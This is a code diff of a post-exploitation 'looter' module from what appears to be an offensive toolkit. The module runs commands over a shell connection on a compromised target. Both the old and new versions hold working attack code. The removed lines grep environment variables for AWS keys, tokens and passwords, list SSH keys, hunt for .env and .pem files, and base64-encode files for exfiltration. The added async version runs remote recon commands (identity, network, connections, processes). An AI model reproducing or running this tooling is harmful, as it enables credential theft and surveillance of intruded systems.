@@ -1,45 +1,38 @@
-# --- Davoid Core: LOOTER (Post-Exploitation) ---
-import time
-import os
-import base64
+import asyncio
+from rich.panel import Panel
 
 
-def run_looter(sock):
+async def run_looter(reader, writer):
     """
-    Automated Intelligence Gathering.
-    Executes system recon, network mapping, and credential search.
+    Automated Intelligence Gathering (Async).
+    Executes system recon commands remotely and returns formatted results.
     """
-    results = {}
+    results = []
 
-    # 1. System Identity
-    commands = {
-        "identity": "whoami && hostname && id",
-        "release": "cat /etc/*release",
-        "env": "env | grep -E 'AWS|SECRET|TOKEN|PASS'",
-        "connections": "netstat -tunapl | grep ESTABLISHED",
-        "ssh_keys": "ls -la ~/.ssh/"
-    }
+    # List of commands to run on the target
+    commands = [
+        ("Identity", "whoami && id && hostname"),
+        ("System Info", "uname -a"),
+        ("Network", "ip addr || ifconfig"),
+        ("Connections", "netstat -tunapl | grep ESTABLISHED"),
+        ("Process List", "ps aux --sort=-%cpu | head -n 5")
+    ]
 
-    for key, cmd in commands.items():
+    for title, cmd in commands:
         try:
-            sock.send((cmd + "\n").encode())
-            time.sleep(0.5)
-            results[key] = sock.recv(4096).decode(
-                'utf-8', errors='ignore').strip()
-        except:
-            results[key] = "Error retrieving data"
+            # Send command
+            writer.write(f"{cmd}\n".encode())
+            await writer.drain()
 
-    # 2. Search for common config files
-    find_cmd = "find . -maxdepth 3 -name '.env' -o -name 'config.json' -o -name '*.pem' 2>/dev/null\n"
-    sock.send(find_cmd.encode())
-    time.sleep(1)
-    results["found_files"] = sock.recv(4096).decode().strip()
+            # Read response with timeout
+            data = await asyncio.wait_for(reader.read(4096), timeout=3.0)
+            output = data.decode('utf-8', errors='ignore').strip()
 
-    return results
+            if output:
+                results.append(f"[bold cyan]{title}:[/bold cyan]\n{output}")
+        except asyncio.TimeoutError:
+            results.append(f"[bold red]{title}:[/bold red]\n[Timeout]")
+        except Exception as e:
+            results.append(f"[bold red]{title}:[/bold red]\nError: {e}")
 
-
-def deep_exfil(sock, target_path):
-    """Encodes a file into base64 for safe exfiltration across the shell."""
-    cmd = f"cat {target_path} | base64\n"
-    sock.send(cmd.encode())
-    # Handle incoming stream in Hub
+    return "\n\n".join(results)
